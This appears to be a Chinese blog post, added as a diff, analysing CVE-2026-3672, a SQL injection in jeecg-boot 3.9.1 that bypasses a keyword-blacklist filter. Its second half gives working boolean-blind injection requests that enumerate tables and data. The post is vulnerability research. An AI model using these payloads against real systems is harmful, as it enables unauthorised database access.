@@ -1,0 +1,955 @@
+
+<!DOCTYPE html><html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 6.3.0">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>jeecg-boot-3.9.1-漏洞分析 - Sherlock</title>
+
+  
+    <meta name="description" content="前言本文参考：CVE-2026-3672 Jeecgboot3.9.1&#x2F;3.9.0 WAF绕过：正则缺陷导致SQL注入 漏洞具体可见：CVE记录：CVE-2026-3672 本文基本为静态分析，环境终于搭建成功但分析完不是很想去动态调试。。。。 分析的jeecg-boot版本为3.9.1 需任意用户权限 漏洞分析下面分析都将基于该payload进行：jeecg-boot&#x2F;sys&#x2F;api&#x2F;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="jeecg-boot-3.9.1-漏洞分析">
+<meta property="og:url" content="http://example.com/2026/04/01/jeecg-boot-3-9-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+<meta property="og:site_name" content="Sherlock">
+<meta property="og:description" content="前言本文参考：CVE-2026-3672 Jeecgboot3.9.1&#x2F;3.9.0 WAF绕过：正则缺陷导致SQL注入 漏洞具体可见：CVE记录：CVE-2026-3672 本文基本为静态分析，环境终于搭建成功但分析完不是很想去动态调试。。。。 分析的jeecg-boot版本为3.9.1 需任意用户权限 漏洞分析下面分析都将基于该payload进行：jeecg-boot&#x2F;sys&#x2F;api&#x2F;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/themes/hexo-theme-stellar/1.jpg">
+<meta property="article:published_time" content="2026-04-01T07:55:06.000Z">
+<meta property="article:modified_time" content="2026-04-02T13:29:08.759Z">
+<meta property="article:author" content="Sherlock">
+<meta property="article:tag" content="智商不够,勤勉来凑;眼神不太好">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/themes/hexo-theme-stellar/1.jpg">
+  
+  
+  
+  <meta name="keywords" content="智商不够,勤勉来凑;眼神不太好">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Sherlock","sameAs":[],"image":"/themes/hexo-theme-stellar/1.jpg"},"dateCreated":"2026-04-01T15:55:06+08:00","dateModified":"2026-04-02T21:29:08+08:00","datePublished":"2026-04-01T15:55:06+08:00","description":"","headline":"jeecg-boot-3.9.1-漏洞分析","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2026/04/01/jeecg-boot-3-9-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"},"publisher":{"@type":"Organization","name":"Sherlock","sameAs":[],"image":"/themes/hexo-theme-stellar/1.jpg","logo":{"@type":"ImageObject","url":"/themes/hexo-theme-stellar/1.jpg"}},"url":"http://example.com/2026/04/01/jeecg-boot-3-9-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/","image":[]}</script>
+  
+</head>
+<body>
+
+<div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="/themes/hexo-theme-stellar/1.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Sherlock</div><div class="sub cap">言念君子，温其如玉</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="社交" href="/friends/" style="color:#F44336"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/05/05/copy-fail-CVE-2026-31431/"><span class="title">copy-fail-CVE-2026-31431</span></a><a class="item title" href="/2024/11/15/JavaDeserializeLabs/"><span class="title">JavaDeserializeLabs</span></a><a class="item title" href="/2026/04/01/jeecg-boot-3-9-1-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><span class="title">jeecg-boot-3.9.1-漏洞分析</span></a><a class="item title" href="/2026/03/15/jeecg-boot-3-8-3-rce%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%88%86%E6%9E%90/"><span class="title">jeecg-boot 3.8.3 rce漏洞复现分析</span></a><a class="item title" href="/2026/03/09/jeecg-boot-3-7-0-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"><span class="title">jeecg-boot 3.7.0 漏洞分析</span></a><a class="item title" href="/2026/01/12/java%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%AE%A1%E8%AE%A1%E5%AD%A6%E4%B9%A0/"><span class="title">java模板注入漏洞审计学习</span></a><a class="item title" href="/2025/06/30/xss%E5%9C%A8%E4%BC%81%E4%B8%9Asrc%E4%B8%AD%E7%9A%84%E6%8C%96%E6%8E%98%E5%A7%BF%E5%8A%BF/"><span class="title">xss在企业src中的挖掘姿势</span></a><a class="item title" href="/2025/12/03/shiro%E5%AE%89%E5%85%A8%E6%A0%A1%E9%AA%8C%E6%B5%81%E7%A8%8B%E9%9B%B6%E5%9F%BA%E7%A1%80%E6%95%99%E5%AD%A6/"><span class="title">shiro安全校验流程零基础教学</span></a><a class="item title" href="/2025/10/30/java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/"><span class="title">java代码审计的一些小技巧</span></a><a class="item title" href="/2025/10/12/Vulnstack%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/"><span class="title">Vulnstack红日靶场(1)</span></a></div></widget>
+</div>
+
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2026-04-01T07:55:06.000Z">2026-04-01</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2026-04-02T13:29:08.759Z">2026-04-02</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>jeecg-boot-3.9.1-漏洞分析</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本文参考：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/91794">CVE-2026-3672 Jeecgboot3.9.1&#x2F;3.9.0 WAF绕过：正则缺陷导致SQL注入</a></p>
+<p>漏洞具体可见：<a target="_blank" rel="noopener" href="https://www.cve.org/CVERecord?id=CVE-2026-3672">CVE记录：CVE-2026-3672</a></p>
+<p>本文基本为静态分析，环境终于搭建成功但分析完不是很想去动态调试。。。。</p>
+<p>分析的jeecg-boot版本为3.9.1</p>
+<p>需任意用户权限</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>下面分析都将基于该payload进行：<code>jeecg-boot/sys/api/getDictItems?dictCode=sys_user,username,id,1=1%20and%20(select%20count(username)%20from%20sys_user)</code></p>
+<p>漏洞点位于：&#x2F;sys&#x2F;dict&#x2F;getDictItems&#x2F;{dictCode}</p>
+<p>因此我们可以锁定SysDictController.java，锁定对应的getDictItems方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 获取字典数据 【接口签名验证】</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dictCode 字典code</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dictCode 表名,文本字段,code字段  | 举例：sys_user,realname,id</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RequestMapping(value = &quot;/getDictItems/&#123;dictCode&#125;&quot;, method = RequestMethod.GET)</span></span><br><span class="line"><span class="keyword">public</span> Result&lt;List&lt;DictModel&gt;&gt; <span class="title function_">getDictItems</span><span class="params">(<span class="meta">@PathVariable(&quot;dictCode&quot;)</span> String dictCode, <span class="meta">@RequestParam(value = &quot;sign&quot;,required = false)</span> String sign,HttpServletRequest request)</span> &#123;</span><br><span class="line">	log.debug(<span class="string">&quot; dictCode : &quot;</span>+ dictCode);</span><br><span class="line">	Result&lt;List&lt;DictModel&gt;&gt; result = <span class="keyword">new</span> <span class="title class_">Result</span>&lt;List&lt;DictModel&gt;&gt;();</span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		List&lt;DictModel&gt; ls = sysDictService.getDictItems(dictCode);</span><br><span class="line">		<span class="keyword">if</span> (ls == <span class="literal">null</span>) &#123;</span><br><span class="line">			result.error500(<span class="string">&quot;字典Code格式不正确！&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> result;</span><br><span class="line">		&#125;</span><br><span class="line">		result.setSuccess(<span class="literal">true</span>);</span><br><span class="line">		result.setResult(ls);</span><br><span class="line">		log.debug(result.toString());</span><br><span class="line">	&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">		log.error(e.getMessage(), e);</span><br><span class="line">		result.error500(<span class="string">&quot;操作失败&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> result;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从注释里面我们可以看到虽然标注了”接口签名验证”，但实际代码中 <code>sign</code> 参数是 <code>required = false</code>，签名校验并未强制执行。加上无 <code>@RequiresPermissions</code> 权限注解，任何登录用户都能调用</p>
+<p>方法的代码逻辑比较简单，我们直接跟进<code>List&lt;DictModel&gt; ls = sysDictService.getDictItems(dictCode);</code></p>
+<img src="../source/imgs/${fiilname}/image-20260401170024849.png" alt="image-20260401170024849" style="zoom: 33%;" />
+
+<p>一开始会判断传入的dictCode参数是否包含逗号，不包含就会走进else从句中的，使用 <code>#&#123;code&#125;</code> 参数化查询；包含的话就会走进if从句里面，按照逗号进行拆分后拼入动态sql中执行</p>
+<p>按逗号拆分形成params数组，可以看到:<br>- 三段格式走 <code>queryTableDictItemsByCode</code><br>- 四段格式走 <code>queryTableDictItemsByCodeAndFilter(params[0], params[1], params[2], params[3])</code></p>
+<p>（最主要利用还是走四段格式的，三段格式虽然要是存在where等关键词会再进行划分然后也会走入四段格式所用的方法，但终究还是过于复杂了点</p>
+<p>于是我们继续跟进四段格式的代码<code>ls = this.queryTableDictItemsByCodeAndFilter(params[0], params[1], params[2], params[3]);</code></p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401171014122.png" alt="image-20260401171014122"></p>
+<p>先走进最下面的sql语句</p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401172323020.png" alt="image-20260401172323020"></p>
+<p>可以看见都是动态直接拼接进去的</p>
+<p>回到该方法，里面一共做了三次过滤：sql注入校验、表字典的黑白名单校验、表名和字段的转义并检验</p>
+<p>看得出来对于前三个参数table、text、code的检测非常严格，具体代码跟进去也是如此</p>
+<p>所以重点就是看filterSql参数了，而它也是仅仅只经历一次的检查</p>
+<p>跟进<code>SqlInjectionUtil.specialFilterContentForDictSql(filterSql);</code></p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401171825212.png" alt="image-20260401171825212"></p>
+<p>先是经历两个检查，一个是sql注释检查，一个是关键词检测</p>
+<p>注释检测跟进<code>checkSqlAnnotation(value);</code></p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401172912832.png" alt="image-20260401172912832"></p>
+<p>其中进行匹配的两个正则表达式定义如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">Pattern</span> <span class="variable">SQL_ANNOTATION</span> <span class="operator">=</span> Pattern.compile(<span class="string">&quot;/\\*[\\s\\S]*\\*/&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span>  <span class="type">String</span> <span class="variable">SQL_ANNOTATION2</span> <span class="operator">=</span> <span class="string">&quot;--&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>很清晰，一个是不允许出现注释符，另一个是不允许进行注释注入</p>
+<p>注入的时候不用这些就好了，从之前的sql语句可以知道filterSql是拼接在where关键词后面的，只要后面闭合好就无事</p>
+<p>继续往下走轮到了字典关键词检测，字典关键词定义如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">specialDictSqlXssStr</span> <span class="operator">=</span> <span class="string">&quot;exec |peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract|insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |;|+|--&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>默认的关键词定义如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">XSS_STR</span> <span class="operator">=</span> <span class="string">&quot;and |exec |peformance_schema|information_schema|extractvalue|updatexml|geohash|gtid_subset|gtid_subtract|insert |select |delete |update |drop |count |chr |mid |master |truncate |char |declare |;|or |+|--&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>对比可以发现字典关键词里面少了and和or</p>
+<p>继续往下走看是怎么检测关键词的，跟进<code>isExistSqlInjectKeyword(value, xssArr[i])</code></p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401205140448.png" alt="image-20260401205140448"></p>
+<p>前面的关键词判断都好理解，其中的FULL_MATCHING_KEYWRODS定义如下所示</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 完整匹配的key，不需要考虑前空格</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> List&lt;String&gt; FULL_MATCHING_KEYWRODS = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line"><span class="keyword">static</span> &#123;</span><br><span class="line">	FULL_MATCHING_KEYWRODS.add(<span class="string">&quot;;&quot;</span>);</span><br><span class="line">	FULL_MATCHING_KEYWRODS.add(<span class="string">&quot;+&quot;</span>);</span><br><span class="line">	FULL_MATCHING_KEYWRODS.add(<span class="string">&quot;--&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>按照上面的poc，我们一定会走到红色框中的部分</p>
+<p><code>String var3 = &quot;\\s+\\S+&quot; + var1;</code>： <code>\s+</code> 匹配一个或多个<strong>空白字符</strong>；<code>\S+</code> 匹配一个或多个<strong>非空白字符</strong>；所以该正则找的就是：**[空白字符] + [非空白字符] + 关键词**</p>
+<p>poc中的<code>%20(select</code>会被匹配成功导致会走入for循环中，但是这边的逻辑写的就很有意思，只有当被匹配的这段内容还存在那几个特殊符号之一的情况下才会返回true，否则就是嘎嘎循环然后出去返回false</p>
+<p>所以我们的poc还是可以顺利地成功绕过</p>
+<p>到目前为止可以说手法跟3.7.0版本的是一模一样的，那么3.9.1做了哪些改进</p>
+<p>回到specialFilterContentForDictSql方法，经过for循环后继续往下走，又进行了两个判断</p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401210504731.png" alt="image-20260401210504731"></p>
+<p>都还是关键词的判断，第一个是对表的过滤，看下XSS_STR_TABLE的定义</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * sql注入黑名单数据库名</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">static</span> <span class="type">String</span> <span class="variable">XSS_STR_TABLE</span> <span class="operator">=</span> <span class="string">&quot;peformance_schema|information_schema&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>对sql注入的常用表名进行了过滤，那就有点难办了</p>
+<p>第二个关键词是对sql注入常用词进行过滤，查看定义</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * sql注入风险的 正则关键字</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 函数匹配，需要用正则模式</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">static</span> String[] XSS_REGULAR_STR_ARRAY = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;</span><br><span class="line">		<span class="string">&quot;chr\\s*\\(&quot;</span>,</span><br><span class="line">		<span class="string">&quot;mid\\s*\\(&quot;</span>,</span><br><span class="line">		<span class="string">&quot; char\\s*\\(&quot;</span>,</span><br><span class="line">		<span class="string">&quot;sleep\\s*\\(&quot;</span>,</span><br><span class="line">		<span class="string">&quot;user\\s*\\(&quot;</span>,</span><br><span class="line">		<span class="string">&quot;show\\s+tables&quot;</span>,</span><br><span class="line">		<span class="string">&quot;user[\\s]*\\([\\s]*\\)&quot;</span>,</span><br><span class="line">		<span class="string">&quot;show\\s+databases&quot;</span>,</span><br><span class="line">		<span class="string">&quot;sleep\\(\\d*\\)&quot;</span>,</span><br><span class="line">		<span class="string">&quot;sleep\\(.*\\)&quot;</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>拦截了 <code>sleep()</code>、<code>user()</code>、<code>chr()</code> 等函数。但<strong>没有覆盖</strong> <code>select</code>、<code>union</code>、<code>database()</code>、<code>substring()</code>、<code>benchmark()</code> 等 → 绕过方式充足</p>
+<p>最后走完这两个检测后，便可以执行我们的sql语句了</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> $&#123;text&#125; <span class="keyword">as</span> &quot;text&quot;, $&#123;code&#125; <span class="keyword">as</span> &quot;value&quot; <span class="keyword">from</span> $&#123;<span class="keyword">table</span>&#125;</span><br><span class="line"><span class="operator">&lt;</span>if test<span class="operator">=</span>&quot;filterSql != null and filterSql != &#x27;&#x27;&quot;<span class="operator">&gt;</span></span><br><span class="line">    <span class="keyword">where</span> $&#123;filterSql&#125;</span><br><span class="line"><span class="operator">&lt;</span><span class="operator">/</span>if<span class="operator">&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>前面的验证型payload可以顺利通过<code>jeecg-boot/sys/api/getDictItems?dictCode=sys_user,username,id,1=1%20and%20(select%20count(username)%20from%20sys_user)</code></p>
+<p>那么接下来我们就要进行布尔盲注了</p>
+<p><code>dictCode=sys_user,username,id,1=1%20and%20(length(database())=10)</code></p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401211432411.png" alt="image-20260401211432411"></p>
+<p>虽然过滤了一些系统表，但<code>mysql.innodb_index_stats</code>能用</p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401211607408.png" alt="image-20260401211607408"></p>
+<p>查当前库下表的数量<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+((select+count(distinct+table_name)+from+mysql.innodb_index_stats+where+database_name&#x3D;database())%3e&#x3D;124) HTTP&#x2F;1.1 </p>
+<p><img src="/../source/imgs/$%7Bfiilname%7D/image-20260401212209828.png" alt="image-20260401212209828"></p>
+<p>第一个表的长度<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and((select+length(min(table_name))+from+mysql.innodb_index_stats+where+database_name&#x3D;database())%3E17) HTTP&#x2F;1.1 </p>
+<p> 第一个字符<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and((select+min(table_name)+from+mysql.innodb_index_stats+where+database_name&#x3D;database())%3E’z’) HTTP&#x2F;1.1 </p>
+<p>由z到a进行比较如果返回真说明是这个字母</p>
+<p>第二个字符<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and((select+min(table_name)+from+mysql.innodb_index_stats+where+database_name&#x3D;database())%3E’az’) HTTP&#x2F;1.1 </p>
+<p>接在第一个字符的后面还是从z开始，这是不变的。</p>
+<p>后面以此类推。</p>
+<p> 假如表名是aigc_word_template<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and((select+min(table_name)+from+mysql.innodb_index_stats+where+database_name&#x3D;database())%3d’aigc_word_template’) HTTP&#x2F;1.1 </p>
+<p>会返回真</p>
+<p> 第二个表的长度<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and((select+length(min(table_name))+from+mysql.innodb_index_stats+where+database_name&#x3D;database()+and+table_name%3E’aigc_word_template’)%3E8) HTTP&#x2F;1.1 </p>
+<p> 判断字段是否存在<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and(select+count(id)+from+aigc_word_template)%3E&#x3D;0 HTTP&#x2F;1.1 </p>
+<p> 表行数<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+(select+count(*)+from+aigc_word_template)%3E1 HTTP&#x2F;1.1 </p>
+<p>判断表中是否有数据<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+(select+count(*)+from+aigc_word_template)%3E0 HTTP&#x2F;1.1 </p>
+<p> 验证id非空行<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+(select+count(id)+from+aigc_word_template+where+id+is+not+null)%3E0 HTTP&#x2F;1.1 </p>
+<p> 确定字段内容长度<br>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+id+from+aigc_word_template+where+length(id)%3e0) HTTP&#x2F;1.1 </p>
+<p>从0开始，为真就继续加</p>
+<p>GET &#x2F;jeecg-boot&#x2F;sys&#x2F;api&#x2F;getDictItems?dictCode&#x3D;sys_user,username,id,1&#x3D;1+and+exists(select+id+from+aigc_word_template+where+length(id)%3e19) HTTP&#x2F;1.1</p>
+<p>为假了说明就是这个了</p>
